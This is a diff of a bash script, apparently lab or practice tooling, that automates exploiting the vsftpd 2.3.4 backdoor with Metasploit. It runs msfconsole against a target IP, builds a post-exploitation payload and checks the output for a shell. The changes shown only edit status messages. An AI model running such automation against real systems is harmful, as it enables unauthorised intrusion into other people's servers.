@@ -26,7 +26,7 @@ EOF
 }
 
 checkSuccess() {
-    echo "[!] Checking Exploitation Success..."
+    echo "[*] Checking Exploitation Success..."
 
     # Check if the Metasploit output contains signs of success
     if grep -q "Found shell" $msfOutputFile && grep -q "whoami" $msfOutputFile; then
@@ -38,16 +38,17 @@ checkSuccess() {
 }
 
 main() {
-    echo "[!] Starting Exploitation Script..."
-    echo "[!] Generating Metasploit Resources..."
+    echo "[!] Found vsftpd 2.3.4 vulnerability..."
+    echo "[!] Starting Exploitation..."
+    echo "[*] Generating Metasploit Resources..."
 
     generateMetasploitResource
 
-    echo "[!] Generating Post Exploitation Resources..."
+    echo "[*] Generating Post Exploitation Payload..."
 
     generatePostExploitationScript
 
-    echo "[!] Exploiting Vulnerable FTP Service On $targetIpAddress"
+    echo "[*] Exploiting Vulnerability On $targetIpAddress..."
 
     # Run the exploit and capture the output
     msfconsole -r $msfScriptPath/vsftpd.rc > $msfOutputFile 2>&1
@@ -57,7 +58,7 @@ main() {
 
     echo "[!] Exploitation Finished!"
 
-    # Return the success flag as the script's exit code (optional)
+    # Return the success flag
     exit $successFlag
 }
 
